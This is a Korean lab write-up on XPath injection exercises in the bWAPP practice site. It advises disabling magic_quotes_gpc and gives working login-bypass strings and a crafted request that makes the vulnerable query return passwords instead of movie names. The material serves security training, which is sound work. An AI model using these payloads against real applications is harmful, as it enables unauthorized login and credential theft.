### bwapp

APM 기반의 실습 사이트이며, YOUTUBE 동영상으로도 실습 방법을 잘 제공하고 있어 매우 유용하다.

XPATH에 대해서는 알려진 자료가 부족하여 여기에 다시 다룬다.


### PHP 설정

직접 APM을 구축하였다면, 여러 설정들로 실습에 난항이 있다.

magic_quotes_gpc = On 일 경우, sql injection 및 싱글쿼트(')사 사용되는 XPATH injection 도 할 수 없다.

magic_quotes_gpc = Off 로 수정하거나, 입력 파라미터가 적용되기 전에 역슬래시를 제거한다.

stripslahes 함수도 써본다.

### XPATH 1

XPATH 관련 실습 과제가 2개가 있는데, 하나는 로그인 우회이다.

이는 SQL Injection과 거의 같다.

' or '1'='1

코드 형태에 따라 첫번째 사용자에 대해서 출력되거나, 입력된 사용자를 출력한다.

사용자를 확인하는 코드라면 {사용자}' or '1'='1 로 수정해야 동작할 것이다.

wolverine' or 'a'='a--

형태로 사용자명을 넣어주면, 원하는 사용자로 로그인 할 수 있다.


### XPATH 2

XPATH 실습 두번째는 union 과 유사하다.

코드에 따라 다르지만, bWAPP에서 제공하는 코드는 contains를 사용하여 vertical bar;(｜)로 조합한다.

실습 코드는 원래 장르에 따른 영화 이름을 출력하지만, 공격 코드는 패스워드를 출력하도록 되어 있다.

이해를 더 하고 싶으면, 서버를 구성하여, 조합된 공격 코드의 전체 구조를 확인하는 것이 좋다.


### XPATH 2 상세 내용

[코드]

$result = $xml->xpath("//hero[contains(genre, '**$genre**')]/movie");


[정상요청]

xmli_2.php?genre=**action**&action=search

[정상 외부 입력]

$xml->xpath(//hero[contains(genre, '**action**')]/movie);


[공격요청]

xmli_2.php?genre=**action')]/password+｜+//hero\[contains(genre,'+horror**&action=search

[공격 외부 입력]

$xml->xpath(//hero[contains(genre, '**action')]/password ｜ //hero[contains(genre,' horror**')]/movie)
